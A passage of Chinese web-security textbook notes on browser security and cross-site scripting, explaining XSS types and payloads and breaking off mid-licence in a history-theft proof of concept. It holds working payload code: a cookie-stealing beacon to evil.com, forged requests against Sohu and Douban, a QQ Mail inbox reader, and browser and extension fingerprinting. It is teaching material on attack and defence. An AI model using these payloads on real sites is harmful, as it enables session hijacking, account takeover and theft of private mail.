<p>但是Firefox却不如此解析，www.google.com\abc将被认为是非法的地址，无法打开。</p>
<p>扩展和插件的权限都高于页面JavaScript的权限，比如可以进行一些跨域网络请求等。</p>
<p>在插件中，也曾经出现过一些具有恶意功能的程序，比如代号为Trojan.PWS.ChromeInject.A的恶意插件，其目标是窃取网银密码</p>
<p><hr></p>
<h3 id="2-5-小结"><a href="#2-5-小结" class="headerlink" title="2.5 小结"></a>2.5 小结</h3><p>浏览器是互联网的重要入口，在安全攻防中，浏览器的作用也越来越被人们所重视。在以往研究攻防时，大家更重视的是服务器端漏洞；而在现在，安全研究的范围已经涵盖了所有用户使用互联网的方式，浏览器正是其中最为重要的一个部分。</p>
<p>浏览器的安全以同源策略为基础，加深理解同源策略，才能把握住浏览器安全的本质。在当前浏览器高速发展的形势下，恶意网址检测、插件安全等问题都会显得越来越重要。紧跟浏览器发展的脚步来研究浏览器安全，是安全研究者需要认真对待的事情。</p>
<p><hr></p>
<h3 id="第3章-跨站脚本攻击（XSS）"><a href="#第3章-跨站脚本攻击（XSS）" class="headerlink" title="第3章　跨站脚本攻击（XSS）"></a>第3章　跨站脚本攻击（XSS）</h3><p>跨站脚本攻击（XSS）是客户端脚本安全中的头号大敌。OWASP TOP 10威胁多次把XSS列在榜首。本章将深入探讨XSS攻击的原理，以及如何正确地防御它。</p>
<p><hr></p>
<h3 id="3-1-XSS简介"><a href="#3-1-XSS简介" class="headerlink" title="3.1 XSS简介"></a>3.1 XSS简介</h3><p>XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。</p>
<p>XSS长期以来被列为客户端Web安全中的头号大敌。因为XSS破坏力强大，且产生的场景复杂，难以一次性解决。现在业内达成的共识是：针对各种不同场景产生的XSS，需要区分情景对待。即便如此，复杂的应用环境仍然是XSS滋生的温床。</p>
<p>XSS根据效果的不同可以分成如下几类。</p>
<p>第一种类型：<code>反射型XSS</code></p>
<p>反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫做“非持久型XSS”（Non-persistent XSS）。</p>
<p>第二种类型：存储型XSS</p>
<p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。<br>比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。黑客把恶意的脚本保存到服务器端，所以这种XSS攻击就叫做“存储型XSS”。<br>存储型XSS通常也叫做“持久型XSS”(Persistent XSS)，因为从效果上来说，它存在的时间是比较长的。</p>
<p>第三种类型：DOM Based XSS</p>
<p>实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。<br>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
<p>看如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">function test()&#123;</div><div class="line">  var str = document.getElementById(&quot;text&quot;).value;</div><div class="line">  document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos; &gt;testLink&lt;/a&gt;&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;div id=&quot;t&quot; &gt;&lt;/div&gt;</div><div class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</div><div class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;</div></pre></td></tr></table></figure>
<p>点击“write”按钮后，会在当前页面插入一个超链接，其地址为文本框的内容：<br>在这里，“write”按钮的onclick事件调用了test()函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当做HTML写入到页面中，这就造成了DOM based XSS。</p>
<p>构造如下数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&apos; onclick=alert(/xss/) //</div></pre></td></tr></table></figure>
<p>输入后，页面代码就变成了：<code>&lt;a  href=&#39;&#39; onlick=alert(/xss/)//&#39; &gt;testLink&lt;/a&gt;</code></p>
<p>首先用一个单引号闭合掉<code>href</code>的第一个单引号，然后插入一个<code>onclick</code>事件，最后再用注释符“//”注释掉第二个单引号。</p>
<p>实际上，这里还有另外一种利用方式——除了构造一个新事件外，还可以选择闭合掉<code>&lt;a&gt;</code>标签，并插入一个新的HTML标签。尝试如下输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&apos;&gt;&lt;img src=# onerror=alert(/xss2/) /&gt;&lt;&apos;</div><div class="line">页面代码变成了：</div><div class="line">&lt;a href=&apos;&apos;&gt;&lt;img src=# onerror=alert(/xss2/) /&gt;&lt;&apos;&apos; &gt;testLink&lt;/a&gt;</div><div class="line">脚本被执行：</div></pre></td></tr></table></figure>
<p><hr></p>
<h3 id="3-2-1-初探XSS-Payload"><a href="#3-2-1-初探XSS-Payload" class="headerlink" title="3.2.1 初探XSS Payload"></a>3.2.1 初探XSS Payload</h3><p>XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为“XSS Payload”。</p>
<p><code>XSS Payload</code>实际上就是JavaScript脚本（还可以是Flash或其他富客户端的脚本），所以任何JavaScript脚本能实现的功能，<code>XSS Payload</code>都能做到。<br>一个最常见的<code>XSS Payload</code>，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。<br>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。</p>
<p>攻击者先加载一个远程脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。</p>
<p>在evil.js中，可以通过如下代码窃取Cookie：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var img = document.createElement(&quot;img&quot;);</div><div class="line">img.src = &quot;http://www.evil.com/log?&quot;+escape(document.cookie);</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure>
<p>这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。<br>事实上，<code>http://www.evil.com/log</code>并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">127.0.0.1 - - [19/Jul/2010:11:30:42 +0800] &quot;GET /log?cookie1%3D1234 HTTP/1.1&quot; 404 288</div></pre></td></tr></table></figure>
<p>这样，就完成了一个最简单的窃取Cookie的<code>XSS Payload</code>。<br>如何利用窃取的Cookie登录目标用户的账户呢？这和“利用自定义Cookie访问网站”的过程是一样的，参考如下过程。</p>
<p>在Firefox中访问用户的百度空间，登录后查看当前的Cookie：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">查看当前页面的Cookie值</div><div class="line">然后打开IE，访问同一个页面。此时在IE中，用户是未登录状态：</div><div class="line">用户处于未登录状态</div><div class="line">将Firefox中登录后的Cookie记录下来，并以之替换当前IE中的Cookie。重新发送这个包：使用同一Cookie值重新发包</div><div class="line">通过返回的页面可以看到，此时已经登录进该账户：返回登录后的状态页面</div><div class="line">验证一下，把返回的HTML代码复制到本地打开后，可以看到右上角显示了账户信息相关的数据：</div><div class="line">返回页面是已登录状态</div></pre></td></tr></table></figure>
<p>所以，通过XSS攻击，可以完成“Cookie劫持”攻击，直接登录进用户的账户。</p>
<p>这是因为在当前的Web中，Cookie一般是用户登录的凭证，浏览器发起的所有请求都会自动带上Cookie。如果Cookie没有绑定客户端信息，当攻击者窃取了Cookie后，就可以不用密码登录进用户的账户。</p>
<p>Cookie的“HttpOnly”标识可以防止“Cookie劫持”</p>
<p><hr></p>
<h3 id="3-2-2-强大的XSS-Payload"><a href="#3-2-2-强大的XSS-Payload" class="headerlink" title="3.2.2 强大的XSS Payload"></a>3.2.2 强大的XSS Payload</h3><p>“Cookie劫持”并非所有的时候都会有效。有的网站可能会在Set-Cookie时给关键Cookie植入HttpOnly标识；有的网站则可能会把Cookie与客户端IP绑定（相关内容在“XSS的防御”一节中会具体介绍），从而使得XSS窃取的Cookie失去意义。<br>尽管如此，在XSS攻击成功后，攻击者仍然有许多方式能够控制用户的浏览器。</p>
<p>构造GET与POST请求</p>
<p>一个网站的应用，只需要接受HTTP协议中的GET或POST请求，即可完成所有操作。对于攻击者来说，仅通过JavaScript，就可以让浏览器发起这两种请求。</p>
<p>假设Sohu博客所在域的某页面存在XSS漏洞，那么通过JavaScript，这个过程如下。</p>
<p>正常删除该文章的链接是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012</div></pre></td></tr></table></figure>
<p>对于攻击者来说，只需要知道文章的id，就能够通过这个请求删除这篇文章了。在本例中，文章的id是156713012。<br>攻击者可以通过插入一张图片来发起一个GET请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var img = document.createElement(&quot;img&quot;);</div><div class="line">img.src = &quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot;;</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure>
<p>攻击者只需要让博客的作者执行这段JavaScript代码（XSS Payload），就会把这篇文章删除。在具体攻击中，攻击者将通过XSS诱使用户执行XSS Payload。</p>
<p>再看一个复杂点的例子。如果网站应用者接受POST请求，那么攻击者如何实施XSS攻击呢？</p>
<p>下例是Douban的一处表单。攻击者将通过JavaScript发出一个POST请求，提交此表单，最终发出一条新的消息。在正常情况下，发出一条消息，浏览器发的包是：<br>Douban上发新消息的请求包</p>
<p>要模拟这一过程，有两种方法。第一种方法是，构造一个form表单，然后自动提交这个表单：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</div><div class="line">f.action = <span class="string">""</span>;</div><div class="line">f.method = <span class="string">"post"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(f);</div><div class="line"></div><div class="line"><span class="keyword">var</span> i1 = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">i1.name = <span class="string">" ck"</span>;</div><div class="line">i1.value = <span class="string">" JiUY"</span>;</div><div class="line">f.appendChild(i1);</div><div class="line"></div><div class="line"><span class="keyword">var</span> i2 = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">i2.name = <span class="string">" mb_text"</span>;</div><div class="line">i2.value = <span class="string">"testtesttest"</span>;</div><div class="line">f.appendChild(i2);</div><div class="line"></div><div class="line">f.submit();</div></pre></td></tr></table></figure>
<p>如果表单的参数很多的话，通过构造DOM节点的方式，代码将会非常冗长。所以可以直接写HTML代码，这样会使得整个代码精简很多，如下所示：var dd = document.createElement(“div”);</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="built_in">document</span>.body.appendChild(dd);</div><div class="line">dd.innerHTML = <span class="string">'&lt;form action="" method="post" id="xssform" name="mbform"&gt;'</span>+</div><div class="line"><span class="string">'&lt;input type="hidden" value="JiUY" name="ck" /&gt;'</span>+</div><div class="line"><span class="string">'&lt;input type="text" value="testtesttest" name="mb_text" /&gt;'</span>+</div><div class="line"><span class="string">'&lt;/form&gt;'</span></div><div class="line"></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"xssform"</span>).submit();</div></pre></td></tr></table></figure>
<p>自动提交表单成功：<br>通过表单自动提交发消息成功</p>
<p>第二种方法是，通过XMLHttpRequest发送一个POST请求：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="string">"http://www.douban.com"</span>;</div><div class="line"><span class="keyword">var</span> postStr = <span class="string">"ck=JiUY&amp;mb_text=test1234"</span>;</div><div class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)&#123;</div><div class="line">  ajax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.ActiveXObject)&#123;</div><div class="line">  ajax = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">  <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ajax.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</div><div class="line">ajax.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">ajax.send(postStr);</div><div class="line"></div><div class="line">ajax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span> (ajax.readyState == <span class="number">4</span> &amp;&amp; ajax.status == <span class="number">200</span>)&#123;</div><div class="line">    alert(<span class="string">"Done!"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>再次提交成功：</p>
<p>通过XMLHttpRequest发消息成功<br>通过这个例子可以清楚地看到，使用JavaScript模拟浏览器发包并不是一件困难的事情。<br>所以XSS攻击后，攻击者除了可以实施“Cookie劫持”外，还能够通过模拟GET、POST请求操作用户的浏览器。这在某些隔离环境中会非常有用，比如“Cookie劫持”失效时，或者目标用户的网络不能访问互联网等情况。</p>
<p>下面这个例子将演示如何通过XSS Payload读取QMail用户的邮件文件夹。<br>首先看看正常的请求是如何获取到所有的邮件列表的。登录邮箱后，可以看到：<br>QQ邮箱的界面</p>
<p>点击“收件箱”后，看到邮件列表。抓包发现浏览器发出了如下请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://m57.mail.qq.com/cgi-bin/mail_list?sid=6alhx3p5yzh9a2om7U51dDyz&amp;folderid=1&amp;page</div><div class="line">=0&amp;s=inbox&amp;loc=folderlist,,,1</div></pre></td></tr></table></figure>
<p>QQ邮箱的邮件列表<br>经过分析发现，真正能访问到邮件列表的链接是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&amp;page=0&amp;s=inbox&amp;sid=6alhx3p5yzh9a2</div><div class="line">om7U51dDyz</div></pre></td></tr></table></figure>
<p>在Firebug中分析QQ邮箱的页面内容<br>这里有一个无法直接构造出的参数值：sid。从字面推测，这个sid参数应该是用户ID加密后的值。<br>所以，XSS Payload的思路是先获取到sid的值，然后构造完整的URL，并使用XMLHttpRequest请求此URL，应该就能得到邮件列表了。XSS Payload如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">if (top.window.location.href.indexOf("sid=")&gt;0)&#123;</div><div class="line">  var sid = top.window.location.href.substr(top.window.location.href.indexOf("sid=")</div><div class="line">  +4,24);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">var folder_url = "http://"+top.window.location.host+"/cgi-bin/mail_list?folderid=</div><div class="line">1&amp;page=0&amp;s=inbox&amp;sid="+sid;</div><div class="line"></div><div class="line">var ajax = null;</div><div class="line">if(window.XMLHttpRequest)&#123;</div><div class="line">  ajax = new XMLHttpRequest();</div><div class="line">&#125;</div><div class="line">else if(window.ActiveXObject)&#123;</div><div class="line">  ajax = new ActiveXObject("Microsoft.XMLHTTP");</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">  return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ajax.open("GET", folder_url, true);</div><div class="line">ajax.send(null);</div><div class="line"></div><div class="line">ajax.onreadystatechange = function()&#123;</div><div class="line">  if (ajax.readyState == 4 &amp;&amp; ajax.status == 200)&#123;</div><div class="line">    alert(ajax.responseText);</div><div class="line">    //document.write(ajax.responseText)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>执行这段代码后：</p>
<p>获取邮件内容<br>邮件列表的内容成功被XSS Payload获取到。<br>攻击者获取到邮件列表的内容后，还可以读取每封邮件的内容，并发送到远程服务器上。这只需要构造不同的GET或POST请求即可，在此不再赘述，有兴趣的读者可以自己通过JavaScript实现这个功能。</p>
<p>XSS并非万能。在前文的例子中，XSS的攻击过程都是在浏览器中通过JavaScript脚本自动进行的，也就是说，缺少“与用户交互”的过程。</p>
<p>比如在前文提到的“通过POST表单发消息”的案例中，如果在提交表单时要求用户输入验证码，那么一般的XSS Payload都会失效；此外，在大多数“修改用户密码”的功能中，在提交新密码前，都会要求用户输入“Old Password”。而这个“Old Password”，对于攻击者来说，往往是不知道的。<br>但是，这就能限制住XSS攻击吗？答案是否定的。<br>对于验证码，XSS Payload可以通过读取页面内容，将验证码的图片URL发送到远程服务器上来实施——攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</p>
<p>修改密码的问题稍微复杂点。为了窃取密码，攻击者可以将XSS与“钓鱼”相结合。<br>实现思路很简单：利用JavaScript在当前页面上“画出”一个伪造的登录框，当用户在登录框中输入用户名与密码后，其密码将被发送至黑客的服务器上。<br>通过JavaScript伪造的登录框<br>充分发挥想象力，可以使得XSS攻击的威力更加巨大。</p>
<p>在很多时候，攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。XSS能够帮助攻击者快速达到收集信息的目的。<br>如何通过JavaScript脚本识别浏览器版本呢？最直接的莫过于通过XSS读取浏览器的UserAgent对象：alert(navigator.userAgent);</p>
<p>这个对象，告诉我们很多客户端的信息：<br>OS版本：Windows NT 5.1（这是Windows XP的内核版本）<br>浏览器版本：Firefox 3.6.7<br>系统语言：zh-CN（简体中文）<br>但是浏览器的UserAgent是可以伪造的。比如，Firefox有很多扩展可以屏蔽或自定义浏览器发送的UserAgent。所以通过JavaScript取出来的这个浏览器对象，信息并不一定准确。</p>
<p>但对于攻击者来说，还有另外一种技巧，可以更准确地识别用户的浏览器版本。<br>由于浏览器之间的实现存在差异——不同的浏览器会各自实现一些独特的功能，而同一个浏览器的不同版本之间也可能会有细微差别。所以通过分辨这些浏览器之间的差异，就能准确地判断出浏览器版本，而几乎不会误报。这种方法比读取UserAgent要准确得多。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject)&#123; <span class="comment">// MSIE 6.0 or below</span></div><div class="line"></div><div class="line">  <span class="comment">//判断是否是IE 7以上</span></div><div class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.documentElement &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">document</span>.documentElement.style.maxHeight!=</div><div class="line">    <span class="string">"undefined"</span> )&#123;</div><div class="line"></div><div class="line">      <span class="comment">//判断是否是 IE 8+</span></div><div class="line">      <span class="keyword">if</span> ( <span class="keyword">typeof</span> <span class="built_in">document</span>.adoptNode != <span class="string">"undefined"</span>) &#123; <span class="comment">// Safari3 &amp; FF &amp; Opera &amp; Chrome</span></div><div class="line">        &amp; IE8</div><div class="line">        <span class="comment">//MSIE 8.0  因为同时满足前两个if判断，所以//在这里是IE 8</span></div><div class="line">      &#125;</div><div class="line">      <span class="comment">// MSIE 7.0  否则就是IE 7</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">"msie"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.opera != <span class="string">"undefined"</span>) &#123; <span class="comment">//Opera独占</span></div><div class="line">    <span class="comment">// "Opera "+window.opera.version()</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"opera"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.netscape != <span class="string">"undefined"</span>) &#123; <span class="comment">//Mozilla 独占</span></div><div class="line">    <span class="comment">// "Mozilla"</span></div><div class="line">    <span class="comment">// 可以准确识别大版本</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.Iterator != <span class="string">"undefined"</span>) &#123;</div><div class="line">      <span class="comment">// Firefox 2 以上支持这个对象</span></div><div class="line"></div><div class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.styleSheetSets != <span class="string">"undefined"</span>) &#123; <span class="comment">// Firefox 3 &amp; Opera 9</span></div><div class="line">        <span class="comment">// Firefox 3  同时满足这些条件的必然是 Firefox 3了</span></div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">"mozilla"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.pageXOffset != <span class="string">"undefined"</span>) &#123; <span class="comment">// Mozilla &amp; Safari</span></div><div class="line">    <span class="comment">//"Safari"</span></div><div class="line">    <span class="keyword">try</span>&#123;</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> external.AddSearchProvider != <span class="string">"undefined"</span>) &#123; <span class="comment">// Firefox &amp; Google Chrome</span></div><div class="line">        <span class="comment">//Google Chrome</span></div><div class="line">        <span class="keyword">return</span> <span class="string">"chrome"</span>;</div><div class="line">      &#125;</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">"safari"</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123; <span class="comment">//unknown</span></div><div class="line">    <span class="comment">//Unknown</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"unknown"</span>;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>这段代码，找到了几个浏览器独有的对象，能够识别浏览器的大版本。依据这个思路，还可以找到更多“独特的”浏览器对象。</p>
<p>安全研究者Gareth Heyes曾经找到一种更巧妙的方法，通过很精简的代码，即可识别出不同的浏览器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">//Firefox detector 2/3 by DoctorDan</div><div class="line">FF=/a/[-1]==&apos;a&apos;</div><div class="line"></div><div class="line">//Firefox 3 by me:-</div><div class="line">FF3=(function x()&#123;&#125;)[-5]==&apos;x&apos;</div><div class="line"></div><div class="line">//Firefox 2 by me:-</div><div class="line">FF2=(function x()&#123;&#125;)[-6]==&apos;x&apos;</div><div class="line"></div><div class="line">//IE detector I posted previously</div><div class="line">IE=&apos;\v&apos;==&apos;v&apos;</div><div class="line"></div><div class="line">//Safari detector by me</div><div class="line">Saf=/a/.__proto__==&apos;//&apos;</div><div class="line"></div><div class="line">//Chrome by me</div><div class="line">Chr=/source/.test((/a/.toString+&apos;&apos;))</div><div class="line"></div><div class="line">//Opera by me</div><div class="line">Op=/^function \(/.test([].sort)</div><div class="line"></div><div class="line">//IE6 detector using conditionals</div><div class="line">try &#123;IE6=@cc_on @_jscript_version &lt;= 5.7&amp;&amp;@_jscript_build&lt;10000</div><div class="line"></div><div class="line">精简为一行代码，即：</div><div class="line">B=(function x()&#123;&#125;)[-5]==&apos;x&apos;?&apos;FF3&apos;:(function</div><div class="line">x()&#123;&#125;)[-6]==&apos;x&apos;?&apos;FF2&apos;:/a/[-1]==&apos;a&apos;?&apos;FF&apos;:&apos;\v&apos;==&apos;v&apos;?&apos;IE&apos;:/a/.__proto__==&apos;//&apos;?&apos;Saf&apos;:/s/.</div><div class="line">test(/a/.toString)?&apos;Chr&apos;:/^function \(/.test([].sort)?&apos;Op&apos;:&apos;Unknown&apos;</div></pre></td></tr></table></figure>
<p>知道了用户使用的浏览器、操作系统后，进一步可以识别用户安装的软件。<br>在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。这种方法很早就被用于“挂马攻击”——黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。<br>看如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">try &#123;</div><div class="line">var Obj = new ActiveXObject(‘XunLeiBHO.ThunderIEHelper’);</div><div class="line">&#125; catch (e)&#123;</div><div class="line">  // 异常了，不存在该控件</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码检测迅雷的一个控件（<code>XunLeiBHO.ThunderIEHelper</code>）是否存在。如果用户安装了迅雷软件，则默认也会安装此控件。因此通过判断此控件，即可推测用户安装了迅雷软件的可能性。</p>
<p>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。</p>
<p>一些第三方软件也可能会泄露一些信息。比如Flash有一个<code>system.capabilities</code>对象，能够查询客户端电脑中的硬件信息：Flash的<code>system.capabilities</code>对象<br>在XSS Payload中使用时，可以在Flash的ActionScript中读取<code>system.capabilities</code>对象后，将结果通过ExternalInterface传给页面的JavaScript。这个过程在此不再赘述了。<br>浏览器的扩展和插件也能被XSS Payload扫描出来。比如对于Firefox的插件和扩展，有着不同的检测方法。<br>Firefox的插件（Plugins）列表存放在一个DOM对象中，通过查询DOM可以遍历出所有的插件：Firefox的plugins对象<br>所以直接查询<code>navigator.plugins</code>对象，就能找到所有的插件了。在上图中所示的插件是“navigator.plugins[0]”。</p>
<p>而Firefox的扩展（Extension）要复杂一些。有安全研究者想出了一个方法：通过检测扩展的图标，来判断某个特定的扩展是否存在。在Firefox中有一个特殊的协议：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">chrome://，Firefox的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问：</div><div class="line">chrome://flashgot/skin/icon32.png</div></pre></td></tr></table></figure>
<p>扫描Firefox扩展时，只需在JavaScript中加载这张图片，如果加载成功，则扩展存在；反之，扩展不存在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var m = new Image();</div><div class="line">  m.onload = function() &#123;</div><div class="line">    alert(1);</div><div class="line">    //图片存在</div><div class="line">  &#125;;</div><div class="line">  m.onerror = function() &#123;</div><div class="line">    alert(2);</div><div class="line">    //图片不存在</div><div class="line">  &#125;;</div><div class="line">  m.src = &quot;chrome://flashgot/skin/icon32.png&quot;;  //连接图片</div></pre></td></tr></table></figure>
<p><hr></p>
<h3 id="3-2-2-5-CSS-History-Hack"><a href="#3-2-2-5-CSS-History-Hack" class="headerlink" title="3.2.2.5　CSS History Hack"></a>3.2.2.5　CSS History Hack</h3><p>我们再看看另外一个有趣的XSS Payload——通过CSS，来发现一个用户曾经访问过的网站。<br>这个技巧最早被Jeremiah Grossman发现，其原理是利用style的visited属性——如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;body&gt;</div><div class="line"> &lt;a href=# &gt;曾经访问过的&lt;/a&gt;</div><div class="line"> &lt;a href=&quot;notexist&quot; &gt;未曾访问过的&lt;/a&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p>浏览器会将点击过的链接示以不同的颜色：<br>安全研究者Rsnake公布了一个POC，其效果如下：<br>Rsnake演示的攻击效果<br>红色标记的，就是用户曾经访问过的网站（即Visited下的两个网站）。<br>这个POC代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">&lt;!--</div><div class="line"><span class="comment">/*</span></div><div class="line">NAME: JavaScript History Thief</div><div class="line">AUTHOR: Jeremiah Grossman</div><div class="line"></div><div class="line">BSD LICENSE:</div><div class="line">Copyright (c) 2006, WhiteHat Security, Inc.</div><div class="line">All rights reserved.</div><div class="line"></div><div class="line">Redistribution and use in source and binary forms, with or without</div><div class="line">modification, are permitted provided that the following conditions are met:</div><div class="line">* Redistributions of source code must retain the above copyright notice,</div><div class="line">  this list of conditions and the following disclaimer.</div><div class="line">* Redistributions in binary form must reproduce the above copyright notice,</div><div class="line">  this list of conditions and the following disclaimer in the documentation</div><div class="line">  and/or other materials provided with the distribution.</div><div class="line">* Neither the name of the WhiteHat Security nor the names of its contributors</div><div class="line">  may be used to endorse or promote products derived from this software</div><div class="line">  without specific prior written permission.</div><div class="line"></div><div class="line">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"</div><div class="line">AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</div><div class="line">IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE</div><div class="line">ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE</div><div class="line">LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR</div><div class="line">CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF</div><div 